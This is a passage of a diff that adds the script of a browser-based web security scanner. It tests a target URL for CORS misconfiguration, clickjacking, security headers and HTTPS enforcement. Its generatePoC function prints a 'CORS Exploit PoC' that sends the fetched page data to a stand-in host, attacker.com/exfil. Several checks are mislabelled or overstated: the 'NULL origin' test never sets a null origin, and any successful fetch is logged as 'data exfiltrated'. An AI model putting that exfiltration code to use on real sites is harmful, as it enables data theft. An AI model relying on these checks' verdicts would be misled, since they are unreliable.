+    console.log('Clickjacking: Site can be embedded in iframe (VULNERABLE)');
+};
+iframe.onerror = () => {
+    console.log('Clickjacking: Site blocks iframe embedding (PROTECTED)');
+};
+
+=== RECOMMENDATIONS ===
+${analysis.recommendations.length > 0 ? 
+analysis.recommendations.map((r, i) => `${i + 1}. ${r}`).join('\n') : 
+'All headers appear to be properly configured.'}`;
+
+    headersPocContent.textContent = headersPoc;
+    
+    // Switch to headers tab
+    switchPocTab('headers');
+    showPocPanel();
+}
+
+function updateHttpsPoc(targetUrl, isSecure) {
+    const httpsPoc = `=== HTTPS ENFORCEMENT TEST ===
+Target: ${targetUrl}
+Test Date: ${new Date().toLocaleString()}
+HTTPS Status: ${isSecure ? 'SECURE' : 'VULNERABLE'}
+
+${isSecure ? 
+'✅ HTTPS properly enforced. HTTP requests are blocked or redirected.' :
+'⚠ HTTPS NOT ENFORCED. Site may be accessible via plain HTTP.'}
+
+=== TEST SCRIPTS ===
+
+// Test 1: Check if HTTP version is accessible
+const httpUrl = '${targetUrl}'.replace('https://', 'http://');
+fetch(httpUrl, { method: 'HEAD', redirect: 'manual' })
+.then(response => {
+    console.log(\`HTTP access: \${response.status} \${response.statusText}\`);
+    
+    if (response.ok || response.status === 301 || response.status === 302) {
+        const location = response.headers.get('location');
+        console.log(\`Redirect location: \${location}\`);
+        
+        if (location && location.startsWith('https://')) {
+            console.log('✅ HTTP redirects to HTTPS');
+        } else {
+            console.log('⚠ HTTP accessible without HTTPS redirect');
+        }
+    } else {
+        console.log('✅ HTTP access blocked');
+    }
+})
+.catch(error => {
+    console.log('✅ HTTP access blocked (network error)');
+});
+
+// Test 2: Check HSTS header
+fetch('${targetUrl}', { method: 'HEAD' })
+.then(response => {
+    const hsts = response.headers.get('strict-transport-security');
+    console.log(\`HSTS Header: \${hsts || 'MISSING'}\`);
+    
+    if (hsts && hsts.includes('max-age=')) {
+        const maxAgeMatch = hsts.match(/max-age=(\d+)/);
+        if (maxAgeMatch && parseInt(maxAgeMatch[1]) >= 31536000) {
+            console.log('✅ Strong HSTS policy detected (max-age >= 1 year)');
+        } else {
+            console.log('⚠ Weak HSTS policy');
+        }
+    } else {
+        console.log('⚠ HSTS not implemented');
+    }
+});
+
+// Test 3: Check common HTTP endpoints
+const endpoints = [
+    '${targetUrl}'.replace('https://', 'http://'),
+    '${targetUrl}'.replace('https://', 'http://') + '/login',
+    '${targetUrl}'.replace('https://', 'http://') + '/admin',
+    '${targetUrl}'.replace('https://', 'http://') + '/api',
+    '${targetUrl}'.replace('https://', 'http://') + '/wp-admin'
+];
+
+console.log('Testing HTTP endpoints...');
+endpoints.forEach(endpoint => {
+    fetch(endpoint, { method: 'HEAD', redirect: 'manual' })
+    .then(r => console.log(\`\${endpoint}: \${r.status}\`))
+    .catch(() => console.log(\`\${endpoint}: BLOCKED\`));
+});
+
+=== SECURITY RECOMMENDATIONS ===
+
+${!isSecure ? `
+1. Redirect all HTTP traffic to HTTPS
+2. Implement HSTS with max-age=31536000; includeSubDomains; preload
+3. Set secure cookies with HttpOnly and Secure flags
+4. Use HTTPS for all resources (scripts, styles, images)
+5. Consider submitting to HSTS preload list` : `
+1. Maintain current HTTPS configuration
+2. Consider increasing HSTS max-age
+3. Regularly audit SSL/TLS configuration
+4. Monitor for mixed content issues
+5. Consider HSTS preload submission`}`;
+
+    httpsPocContent.textContent = httpsPoc;
+    
+    // Switch to HTTPS tab
+    switchPocTab('https');
+    showPocPanel();
+}
+
+// ==================== SIMPLIFIED CORS TESTING FUNCTIONS ====================
+async function testCORS() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    hideAllPreviews();
+    corsBox.style.display = 'block';
+    const frame = document.getElementById('corsFrame');
+    
+    logToConsole(`<span class="warn">⏳ PROBING TARGET: ${url}</span>`, "info");
+    updateStatus(corsStatus, 'testing', 'CORS: Probing...');
+    
+    try {
+        // Store request details
+        lastCorsRequest = {
+            url: url,
+            method: 'GET',
+            mode: 'cors',
+            credentials: 'omit',
+            headers: {
+                'Accept': 'text/html,application/xhtml+xml,application/xml',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
+        };
+        
+        const response = await fetch(url, { 
+            method: "GET", 
+            mode: "cors" 
+        });
+        
+        const html = await response.text();
+        
+        // Store response details
+        const headers = {};
+        response.headers.forEach((value, key) => {
+            headers[key.toLowerCase()] = value;
+        });
+        
+        lastCorsResponse = {
+            status: response.status,
+            statusText: response.statusText,
+            type: response.type,
+            url: response.url,
+            headers: headers,
+            bodyPreview: html.substring(0, 500)
+        };
+        
+        logToConsole(`<span class="bad">☠ CRITICAL: HTML DATA EXFILTRATED</span>`, "bad");
+        logToConsole(`<span class="bad">>> CORS VULNERABILITY CONFIRMED</span>`, "bad");
+        logToConsole(`<span class="warn">>> DATA INTERCEPT: SUCCESSFUL</span>`, "warn");
+        
+        corsVulnerable = true;
+        updateStatus(corsStatus, 'vulnerable', 'CORS: VULNERABLE');
+        addCorsResult('Basic CORS Test', 'VULNERABLE', 'Data extraction successful');
+        
+        showExtractedData(html, "CORS Data Extraction");
+        frame.srcdoc = html;
+        
+        // Update CORS POC
+        updateCorsPoc(lastCorsRequest, lastCorsResponse);
+        
+    } catch(error) {
+        logToConsole(`<span class="ok">✔ TARGET SECURED: CORS PROTECTION ACTIVE</span>`, "ok");
+        logToConsole(`<span class="info">>> BREACH ATTEMPT: FAILED</span>`, "info");
+        updateStatus(corsStatus, 'protected', 'CORS: Blocked');
+        addCorsResult('Basic CORS Test', 'BLOCKED', error.message);
+        
+        // Still update POC with error info
+        updateCorsPoc(lastCorsRequest, { 
+            status: 0, 
+            statusText: 'Blocked', 
+            error: error.message 
+        });
+    }
+}
+
+async function testCorsWildcard() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    hideAllPreviews();
+    logToConsole(`<span class="warn">⏳ Testing for wildcard CORS vulnerability...</span>`, "info");
+    
+    try {
+        const response = await fetch(url, { 
+            method: "GET", 
+            mode: "cors" 
+        });
+        
+        const html = await response.text();
+        logToConsole(`<span class="bad">☠ WILDCARD CORS DETECTED</span>`, "bad");
+        logToConsole(`<span class="bad">>> EXTRACTED ${html.length} BYTES OF DATA</span>`, "data");
+        
+        addCorsResult('Wildcard Test', 'VULNERABLE', `Extracted ${html.length} bytes`);
+        
+        showExtractedData(html, "Wildcard CORS Data");
+        corsFrame.srcdoc = html;
+        corsBox.style.display = 'block';
+        
+    } catch(error) {
+        logToConsole(`<span class="ok">✔ No wildcard CORS detected</span>`, "ok");
+        addCorsResult('Wildcard Test', 'SECURE', 'CORS blocked');
+    }
+}
+
+async function testCorsCredentials() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    logToConsole(`<span class="warn">⏳ Testing CORS with credentials...</span>`, "info");
+    
+    try {
+        const response = await fetch(url, { 
+            method: "GET", 
+            mode: "cors",
+            credentials: "include"
+        });
+        
+        const html = await response.text();
+        logToConsole(`<span class="bad">☠ CRITICAL: Credentials vulnerability!</span>`, "bad");
+        logToConsole(`<span class="bad">>> Extracted ${html.length} bytes with credentials</span>`, "data");
+        
+        addCorsResult('Credentials Test', 'VULNERABLE', `Extracted ${html.length} bytes`);
+        
+        showExtractedData(html, `CORS with Credentials`);
+        
+    } catch(error) {
+        logToConsole(`<span class="ok">✔ Credentials properly restricted</span>`, "ok");
+        addCorsResult('Credentials Test', 'SECURE', 'Credentials blocked');
+    }
+}
+
+async function extractHTML() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    logToConsole(`<span class="warn">⏳ Attempting to extract HTML data...</span>`, "info");
+    
+    try {
+        const response = await fetch(url, { 
+            method: "GET", 
+            mode: "cors" 
+        });
+        
+        const html = await response.text();
+        logToConsole(`<span class="bad">☠ HTML EXTRACTION SUCCESS: ${html.length} bytes</span>`, "data");
+        
+        addCorsResult('HTML Extraction', 'SUCCESS', `${html.length} bytes`);
+        
+        showExtractedData(html, "HTML Data");
+        
+    } catch(error) {
+        logToConsole(`<span class="warn">⚠ HTML extraction failed</span>`, "warn");
+        addCorsResult('HTML Extraction', 'FAILED', 'Extraction blocked');
+    }
+}
+
+async function extractJSON() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    logToConsole(`<span class="warn">Looking for JSON data...</span>`, "info");
+    
+    try {
+        const response = await fetch(url, { 
+            method: "GET", 
+            mode: "cors" 
+        });
+        
+        const data = await response.text();
+        logToConsole(`<span class="bad">✓ Found data (${data.length} bytes)</span>`, "data");
+        
+        addCorsResult('JSON Extraction', 'SUCCESS', `Found ${data.length} bytes`);
+        
+        showExtractedData(data, "JSON/Data Extraction");
+        
+    } catch(error) {
+        logToConsole(`<span class="warn">✗ No data found</span>`, "warn");
+        addCorsResult('JSON Extraction', 'FAILED', 'No data accessible');
+    }
+}
+
+async function extractText() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    logToConsole(`<span class="warn">Extracting text content...</span>`, "info");
+    
+    try {
+        const response = await fetch(url, { 
+            method: "GET", 
+            mode: "cors" 
+        });
+        
+        const text = await response.text();
+        
+        // Extract only text (remove HTML tags)
+        const cleanText = text
+            .replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '')
+            .replace(/<style[^>]*>[\s\S]*?<\/style>/gi, '')
+            .replace(/<[^>]+>/g, ' ')
+            .replace(/\s+/g, ' ')
+            .trim();
+        
+        logToConsole(`<span class="bad">✓ Extracted ${cleanText.length} characters of text</span>`, "data");
+        
+        addCorsResult('Text Extraction', 'SUCCESS', `${cleanText.length} characters`);
+        
+        showExtractedData(cleanText.substring(0, 5000), "Text Content");
+        
+    } catch(error) {
+        logToConsole(`<span class="warn">✗ Failed to extract text</span>`, "bad");
+        addCorsResult('Text Extraction', 'FAILED', 'Extraction blocked');
+    }
+}
+
+async function testNullOrigin() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    logToConsole(`<span class="warn">Testing NULL origin CORS...</span>`, "info");
+    
+    try {
+        const response = await fetch(url, { 
+            method: "GET", 
+            mode: "cors" 
+        });
+        
+        const data = await response.text();
+        logToConsole(`<span class='bad'>VULNERABLE: NULL origin can read data!</span>`, "bad");
+        addCorsResult('NULL Origin', 'VULNERABLE', 'NULL origin allowed');
+        
+    } catch(error) {
+        logToConsole(`<span class='ok'>SECURE: NULL origin blocked</span>`, "ok");
+        addCorsResult('NULL Origin', 'SECURE', 'NULL origin blocked');
+    }
+}
+
+async function testMultipleOrigins() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    logToConsole(`<span class="warn">Testing multiple request methods...</span>`, "info");
+    
+    const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'];
+    
+    for (const method of methods) {
+        try {
+            const response = await fetch(url, {
+                method: method,
+                mode: 'cors',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: method !== 'GET' ? '{}' : undefined
+            });
+            
+            logToConsole(`${method}: Allowed`, "bad");
+            
+        } catch (error) {
+            logToConsole(`${method}: Blocked`, "ok");
+        }
+    }
+    
+    addCorsResult('Multiple Methods', 'COMPLETED', `${methods.length} methods tested`);
+}
+
+function generatePoC() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    const pocCode = `// CORS Exploit PoC for: ${url}
+
+// Simple fetch attack
+fetch("${url}", {
+    method: 'GET',
+    mode: 'cors'
+})
+.then(response => response.text())
+.then(data => {
+    console.log('Stolen data:', data);
+    // Send to attacker server
+    fetch('https://attacker.com/exfil', {
+        method: 'POST',
+        body: JSON.stringify({url: "${url}", data: data})
+    });
+})
+.catch(error => console.log('Blocked:', error));`;
+    
+    showExtractedData(pocCode, "CORS Exploit PoC Code");
+    logToConsole("PoC code generated", "data");
+    addCorsResult('PoC Generation', 'GENERATED', 'Exploit code created');
+}
+
+// ==================== CLICKJACKING FUNCTIONS ====================
+async function testClickjacking() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    hideAllPreviews();
+    clickBox.style.display = 'block';
+    logToConsole(`Testing clickjacking for: ${url}`, "info");
+    updateStatus(clickjackStatus, 'testing', 'Clickjacking: Testing...');
+    
+    await checkClickjackHeaders();
+    
+    // Test iframe embedding
+    logToConsole("Testing iframe embedding...", "info");
+    
+    clickFrame.onload = () => {
+        logToConsole("VULNERABLE: Site can be embedded in iframe", "bad");
+        updateStatus(clickjackStatus, 'vulnerable', 'Clickjacking: Vulnerable');
+        updateClickjackPoc(url, true);
+    };
+    
+    clickFrame.onerror = () => {
+        logToConsole("Site blocks iframe embedding", "ok");
+        updateStatus(clickjackStatus, 'protected', 'Clickjacking: Protected');
+        updateClickjackPoc(url, false);
+    };
+    
+    clickFrame.src = url;
+}
+
+async function checkClickjackHeaders() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    logToConsole(`Checking security headers for clickjacking...`, "info");
+    
+    try {
+        const response = await fetch(url, { method: 'HEAD' });
+        
+        headersTable.innerHTML = `
+            <div class="table-header">
+                <div>HEADER</div>
+                <div>STATUS</div>
+                <div>VALUE</div>
+            </div>
+        `;
+        
+        const headers = [
+            'x-frame-options',
+            'content-security-policy',
+            'frame-ancestors'
+        ];
+        
+        let isProtected = false;
+        
+        headers.forEach(header => {
+            let value = response.headers.get(header);
+            let isPresent = false;
+            
+            // Special handling for CSP frame-ancestors
+            if (header === 'frame-ancestors') {
+                const csp = response.headers.get('content-security-policy');
+                if (csp && csp.includes('frame-ancestors')) {
+                    const match = csp.match(/frame-ancestors\s+([^;]+)/);
+                    value = match ? match[1] : 'present';
+                    isPresent = true;
+                }
+            } else {
+                isPresent = !!value;
+            }
+            
+            if (isPresent) {
+                if (header === 'x-frame-options') {
+                    if (value.toUpperCase() === 'DENY' || value.toUpperCase() === 'SAMEORIGIN') {
+                        isProtected = true;
+                    }
+                }
+                if (header === 'content-security-policy' || header === 'frame-ancestors') {
+                    if (!value.includes('*')) {
+                        isProtected = true;
+                    }
+                }
+            }
+            
+            const row = document.createElement('div');
+            row.className = 'table-row';
+            row.innerHTML = `
+                <div class="cell-header">${header}</div>
+                <div class="cell-status ${isPresent ? 'present' : 'missing'}">
+                    ${isPresent ? 'PRESENT' : 'MISSING'}
+                </div>
+                <div class="cell-value" title="${value || 'Not set'}">
+                    ${value ? (value.length > 40 ? value.substring(0, 40) + '...' : value) : '-'}
+                </div>
+            `;
+            headersTable.appendChild(row);
+        });
+        
+        if (isProtected) {
+            logToConsole(`Clickjacking protection detected`, "ok");
+        } else {
+            logToConsole(`No clickjacking protection in headers`, "bad");
+        }
+        
+    } catch (error) {
+        logToConsole(`Failed to check headers: ${error.message}`, "warn");
+    }
+}
+
+function quickClickjackTest() {
+    hideAllPreviews();
+    testClickjacking();
+}
+
+function testIframe() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    logToConsole("Testing iframe embedding...", "info");
+    
+    const iframe = document.createElement('iframe');
+    iframe.style.cssText = `
+        position: absolute;
+        top: -1000px;
+        left: -1000px;
+        width: 100px;
+        height: 100px;
+        visibility: hidden;
+    `;
+    iframe.src = url;
+    
+    iframe.onload = () => {
+        logToConsole(`✓ Iframe loads`, "info");
+        document.body.removeChild(iframe);
+        updateClickjackPoc(url, true);
+    };
+    
+    iframe.onerror = () => {
+        logToConsole(`✗ Iframe blocked`, "info");
+        document.body.removeChild(iframe);
+        updateClickjackPoc(url, false);
+    };
+    
+    document.body.appendChild(iframe);
+    
+    setTimeout(() => {
+        if (iframe.parentNode) {
+            document.body.removeChild(iframe);
+        }
+    }, 2000);
+}
+
+function explainClickjacking() {
+    logToConsole("=== CLICKJACKING EXPLANATION ===", "info");
+    logToConsole("1. Attacker embeds target site in transparent iframe", "info");
+    logToConsole("2. Overlay is placed over iframe with fake buttons", "info");
+    logToConsole("3. User clicks overlay, actually clicks hidden iframe", "info");
+    logToConsole("4. Attacker can trigger actions on victim's behalf", "info");
+    logToConsole("Protection: X-Frame-Options or CSP frame-ancestors", "ok");
+    
+    // Update POC with explanation
+    const url = getTargetURL();
+    if (url) {
+        updateClickjackPoc(url, null);
+    }
+}
+
+// ==================== SECURITY HEADERS FUNCTIONS ====================
+async function testHeaders() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    hideAllPreviews();
+    logToConsole(`Testing security headers on ${url}...`, "info");
+    updateStatus(headersStatus, 'testing', 'Headers: Testing...');
+    
+    try {
+        const response = await fetch(url, { method: 'HEAD' });
+        
+        const securityHeaders = [
+            // Clickjacking protection
+            { name: 'X-Frame-Options', check: (v) => v && (v.toUpperCase() === 'DENY' || v.toUpperCase() === 'SAMEORIGIN') },
+            { name: 'Content-Security-Policy', check: (v) => v && v.includes('frame-ancestors') },
+            
+            // HTTPS enforcement
+            { name: 'Strict-Transport-Security', check: (v) => v && v.includes('max-age=') },
+            
+            // MIME type protection
+            { name: 'X-Content-Type-Options', check: (v) => v && v.toUpperCase() === 'NOSNIFF' },
+            
+            // Referrer control
+            { name: 'Referrer-Policy', check: (v) => v && !v.includes('unsafe') },
+            
+            // XSS protection
+            { name: 'X-XSS-Protection', check: (v) => v && (v.includes('1; mode=block') || v.includes('1; report=')) },
+            
+            // Cross-domain policies
+            { name: 'X-Permitted-Cross-Domain-Policies', check: (v) => v && v.toUpperCase() === 'NONE' },
+            
+            // Certificate transparency
+            { name: 'Expect-CT', check: (v) => v && v.includes('enforce') },
+            
+            // Permissions policy
+            { name: 'Permissions-Policy', check: (v) => v && v.length > 0 },
+            
+            // CORS security
+            { name: 'Cross-Origin-Embedder-Policy', check: (v) => v && (v.includes('require-corp') || v.includes('credentialless')) },
+            { name: 'Cross-Origin-Opener-Policy', check: (v) => v && v.includes('same-origin') },
+            { name: 'Cross-Origin-Resource-Policy', check: (v) => v && v.includes('same-origin') }
+        ];
+        
+        headersTable.innerHTML = `
+            <div class="table-header">
+                <div>HEADER</div>
+                <div>STATUS</div>
+                <div>VALUE</div>
+            </div>
+        `;
+        
+        let securityScore = 0;
+        let totalHeaders = securityHeaders.length;
+        
+        securityHeaders.forEach(header => {
+            const value = response.headers.get(header.name.toLowerCase());
+            const isPresent = !!value;
+            const isSecure = isPresent ? header.check(value) : false;
+            
+            if (isSecure) securityScore++;
+            
+            const row = document.createElement('div');
+            row.className = 'table-row';
+            row.innerHTML = `
+                <div class="cell-header">${header.name}</div>
+                <div class="cell-status ${isPresent ? (isSecure ? 'secure' : 'vulnerable') : 'missing'}">
+                    ${isPresent ? (isSecure ? 'SECURE' : 'INSECURE') : 'MISSING'}
+                </div>
+                <div class="cell-value" title="${value || 'Not set'}">
+                    ${value ? (value.length > 40 ? value.substring(0, 40) + '...' : value) : '-'}
+                </div>
+            `;
+            headersTable.appendChild(row);
+        });
+        
+        const securityPercentage = Math.round((securityScore / totalHeaders) * 100);
+        
+        logToConsole(`Security score: ${securityScore}/${totalHeaders} (${securityPercentage}%)`, 
+                     securityPercentage > 70 ? "ok" : securityPercentage > 40 ? "warn" : "bad");
+        
+        // Update status
+        updateStatus(headersStatus, 
+                     securityPercentage > 70 ? 'protected' : securityPercentage > 40 ? 'unknown' : 'vulnerable', 
+                     `Headers: ${securityPercentage}% secure`);
+        
+        // Add summary row
+        const summaryRow = document.createElement('div');
+        summaryRow.className = 'table-row';
+        summaryRow.style.background = 'rgba(0, 255, 156, 0.1)';
+        summaryRow.innerHTML = `
+            <div class="cell-header">SECURITY SCORE</div>
+            <div class="cell-status ${securityPercentage > 70 ? 'secure' : securityPercentage > 40 ? 'vulnerable' : 'missing'}">
+                ${securityPercentage}%
+            </div>
+            <div class="cell-value">
+                ${securityScore}/${totalHeaders} headers properly configured
+            </div>
+        `;
+        headersTable.appendChild(summaryRow);
+        
+        // Update POC
+        const headersData = securityHeaders.map(h => ({
+            name: h.name,
+            value: response.headers.get(h.name.toLowerCase())
+        }));
+        updateHeadersPoc(headersData);
+        
+    } catch (error) {
+        logToConsole(`Failed to fetch security headers: ${error.message}`, "bad");
+        updateStatus(headersStatus, 'vulnerable', 'Headers: Failed');
+    }
+}
+
+// ==================== HTTPS FUNCTIONS ====================
+async function testHTTPS() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    hideAllPreviews();
+    logToConsole(`Testing HTTPS enforcement...`, "info");
+    updateStatus(httpsStatus, 'testing', 'HTTPS: Testing...');
+    
+    if (!url.startsWith("https://")) {
+        logToConsole("✗ Site is not using HTTPS", "bad");
+        updateStatus(httpsStatus, 'vulnerable', 'HTTPS: Not used');
+        updateHttpsPoc(url, false);
+        return;
+    }
+    
+    const httpURL = url.replace("https://", "http://");
+    const frame = document.getElementById('httpsFrame');
+    let isSecure = true;
+    
+    frame.onload = () => {
+        logToConsole("⚠ HTTP version loads or redirects", "warn");
+        updateStatus(httpsStatus, 'vulnerable', 'HTTPS: Not enforced');
+        isSecure = false;
+        updateHttpsPoc(url, false);
+    };
+    
+    frame.onerror = () => {
+        logToConsole("✔ HTTP blocked or auto‑upgraded to HTTPS", "ok");
+        updateStatus(httpsStatus, 'protected', 'HTTPS: Enforced');
+        updateHttpsPoc(url, true);
+    };
+    
+    frame.src = httpURL;
+    
+    // Fallback timeout
+    setTimeout(() => {
+        if (isSecure) {
+            updateHttpsPoc(url, true);
+        }
+    }, 3000);
+}
+
+async function testHTTPSEnforcement() {
+    const url = getTargetURL();
+    if (!url) return;
+    
+    hideAllPreviews();
+    logToConsole(`Testing comprehensive HTTPS enforcement...`, "info");
+    
+    if (!url.startsWith("https://")) {
+        logToConsole("✗ Site is not using HTTPS", "bad");
+        updateHttpsPoc(url, false);
+        return;
+    }
+    
+    // Test multiple HTTP endpoints
+    const httpURL = url.replace("https://", "http://");
+    const endpoints = [
+        httpURL,
+        httpURL + '/login',
+        httpURL + '/admin',
+        httpURL + '/api'
+    ];
+    
+    let allSecure = true;
+    
+    for (const endpoint of endpoints) {
+        try {
+            const response = await fetch(endpoint, { 
+                method: 'HEAD',
+                redirect: 'manual'
+            });
+            
+            if (response.status === 301 || response.status === 302 || response.status === 307 || response.status === 308) {
+                const location = response.headers.get('location');
+                if (location && location.startsWith('https://')) {
+                    logToConsole(`✓ ${endpoint}: Redirects to HTTPS`, "ok");
+                } else {
+                    logToConsole(`⚠ ${endpoint}: Redirects but not to HTTPS`, "warn");
+                    allSecure = false;
+                }
+            } else if (response.ok) {
+                logToConsole(`✗ ${endpoint}: HTTP accessible without redirect`, "bad");
+                allSecure = false;
+            } else {
+                logToConsole(`✓ ${endpoint}: HTTP blocked (${response.status})`, "ok");
+            }
+        } catch (error) {
+            logToConsole(`✓ ${endpoint}: HTTP blocked (network error)`, "ok");
+        }
+    }
+    
+    updateHttpsPoc(url, allSecure);
+}
+
+// ==================== FULL TEST ====================
+async function runFullTest() {
+    clearAll();
+    logToConsole("Starting comprehensive security test...", "info");
+    
+    await testCORS();
+    await testClickjacking();
+    await testHeaders();
+    await testHTTPS();
+    await testAllHeaders();
+    
+    logToConsole("Comprehensive test complete", "info");
+}
+
+// ==================== INITIALIZATION ====================
+clearAll();
+</script>
 </body>
 </html>
